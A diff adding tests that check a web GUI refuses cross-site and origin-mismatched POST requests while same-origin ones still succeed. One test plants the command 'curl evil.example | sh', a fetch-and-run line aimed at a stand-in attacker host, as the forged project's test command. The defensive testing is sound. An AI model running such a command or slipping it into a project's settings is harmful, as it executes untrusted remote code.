@@ -20,6 +20,60 @@ def test_question_buttons_and_ntfy_answer(client, fresh_db):
     assert r.status_code == 200 and r.json()["ok"] is True
 
 
+def test_cross_site_post_is_refused(client, fresh_db):
+    """The GUI has no auth, so a POST another site set off must not land."""
+    xsite = {"Sec-Fetch-Site": "cross-site"}
+    r = client.post("/add", data={"name": "evil", "gh_repo": "e/x",
+                                  "test_command": "curl evil.example | sh"},
+                    headers=xsite, follow_redirects=False)
+    assert r.status_code == 403
+    assert fresh_db.get_project("evil") is None
+
+    fresh_db.upsert_item("may", "pr", 3, "A PR", "alice", "open", "x")
+    assert client.post("/p/may/pr/3/approve", headers=xsite,
+                       follow_redirects=False).status_code == 403
+    assert fresh_db.get_item("may", "pr", 3)["status"] == "new"
+
+    rid = fresh_db.create_release("may", "1.0.0", "notes", [])
+    assert client.post(f"/p/may/release/{rid}/approve", headers=xsite,
+                       follow_redirects=False).status_code == 403
+    assert fresh_db.get_release(rid)["status"] == "proposed"
+
+    # a tailnet peer's page reads as same-site, which is no better
+    assert client.post("/run-now", headers={"Sec-Fetch-Site": "same-site"},
+                       follow_redirects=False).status_code == 403
+
+
+def test_origin_mismatch_refused(client, fresh_db):
+    """Browsers too old for Sec-Fetch-Site still send Origin."""
+    r = client.post("/add", data={"name": "evil", "gh_repo": "e/x"},
+                    headers={"Origin": "https://evil.example"},
+                    follow_redirects=False)
+    assert r.status_code == 403
+    assert fresh_db.get_project("evil") is None
+
+
+def test_same_origin_post_still_works(client, fresh_db):
+    r = client.post("/add", data={"name": "June", "gh_repo": "example/june",
+                                  "test_command": "pytest"},
+                    headers={"Sec-Fetch-Site": "same-origin",
+                             "Origin": "http://testserver"},
+                    follow_redirects=False)
+    assert r.status_code == 303
+    assert fresh_db.get_project("june")["test_command"] == "pytest"
+
+
+def test_public_url_host_is_accepted(client, fresh_db, monkeypatch):
+    """A proxy may rewrite Host; the advertised public URL still counts."""
+    from harness import config
+    monkeypatch.setattr(config, "PUBLIC_URL", "https://harness.example/")
+    r = client.post("/p/may/tell", data={"text": "Focus on bugs"},
+                    headers={"Origin": "https://harness.example"},
+                    follow_redirects=False)
+    assert r.status_code == 303
+    assert fresh_db.pending_directives("may")
+
+
 def test_health_reports_worker_down(client):
     assert client.get("/health").status_code == 503  # no worker in tests
 
